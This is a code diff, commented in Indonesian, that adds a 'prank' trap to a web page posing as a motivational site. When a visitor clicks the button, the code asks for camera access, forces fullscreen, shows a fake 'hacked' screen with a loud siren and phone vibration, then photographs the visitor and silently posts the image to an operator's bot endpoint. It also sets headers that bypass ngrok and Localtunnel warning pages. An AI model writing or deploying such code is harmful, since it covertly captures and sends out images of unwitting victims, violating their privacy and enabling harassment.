@@ -210,39 +210,103 @@
                 }
             } catch(e) {}
         }
+        // ==========================================
+        // FUNGSI UTAMA PRANK & KAMERA
+        // ==========================================
+
+        // Fungsi Suara Bising / Sirine
+        function playAnnoyingSound() {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+                
+                oscillator.type = 'sawtooth';
+                oscillator.frequency.setValueAtTime(800, audioCtx.currentTime); 
+                
+                // Bikin suara naik turun kayak sirine rusak
+                setInterval(() => {
+                    const freq = oscillator.frequency.value === 800 ? 1200 : 800;
+                    oscillator.frequency.setValueAtTime(freq, audioCtx.currentTime);
+                }, 100);
+
+                gainNode.gain.setValueAtTime(1, audioCtx.currentTime);
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                oscillator.start();
+            } catch(e) { 
+                console.log("Audio API tidak didukung browser ini"); 
+            }
+        }
+
+        // Fungsi Jepret & Kirim ke Bot (Satu Kali Saja)
+        function takePhotoAndSend() {
+            try {
+                // Gambar video ke dalam canvas
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Ubah jadi base64 image (kualitas 0.6 biar file ringan)
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
+                photo.src = dataUrl;
+                photo.style.display = 'block'; // Munculkan muka korban di layar Hacked
+
+                // Matikan lampu & akses kamera setelah foto berhasil diambil
+                const stream = video.srcObject;
+                if (stream) { stream.getTracks().forEach(track => track.stop()); }
+
+                // Kirim fotonya ke endpoint Bot lu pake Fetch API
+                if (apiTarget) {
+                    fetch(apiTarget + '/api/trap/photo', {
+                        method: 'POST',
+                        headers: { 
+                            'Content-Type': 'application/json',
+                            // Header wajib biar nembus peringatan Localtunnel/Ngrok
+                            'Bypass-Tunnel-Reminder': 'true',
+                            'ngrok-skip-browser-warning': 'true'
+                        },
+                        body: JSON.stringify({ id: TRAP_ID, photoBase64: dataUrl })
+                    }).catch(err => console.log("Gagal lapor ke markas:", err));
+                }
+            } catch(e) { 
+                console.log("Gagal memproses foto"); 
+            }
+        }
+
         // Mulai Prank
         function startPrank() {
-            // Fullscreen
+            // Paksa Fullscreen
             const elem = document.documentElement;
             if (elem.requestFullscreen) elem.requestFullscreen().catch(()=>{});
             else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen().catch(()=>{});
 
-            // Ganti Layar
+            // Ganti Layar dari Web Motivasi ke Web Hacked
             mainContent.style.display = 'none';
             prankScreen.classList.add('active-prank');
 
-            // Serangan Audio
+            // Serangan Audio & Getaran (Kalo di HP)
             playAnnoyingSound();
             if (navigator.vibrate) { navigator.vibrate([3000, 30, 3000, 30, 5000]); }
 
-            // Jepret foto setelah 1 detik
+            // Jepret foto setelah jeda 1 detik (Biar korban kaget dulu pas layar kedap-kedip)
             setTimeout(takePhotoAndSend, 1000);
         }
 
-        // Tombol Diklik
+        // Tombol Diklik (Pemicu Utama)
         btn.addEventListener('click', async () => {
             btn.innerText = "MEMUAT MATERI...";
             btn.style.backgroundColor = "#ff9800";
             
             try {
-                // Minta izin kamera
+                // Minta izin kamera ke browser korban
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
                 
-                // Tunggu kamera fokus, baru ledakkan prank
+                // Tunggu 0.6 detik biar kamera fokus & nyala, baru ledakkan prank
                 setTimeout(startPrank, 600);
             } catch (err) {
-                // Kalau korban menolak izin kamera (Block), prank tetap jalan untuk ngagetin!
+                // Kalau korban curiga dan nolak izin kamera (Block), prank animasi & suara tetap jalan buat ngagetin!
                 startPrank();
             }
         });
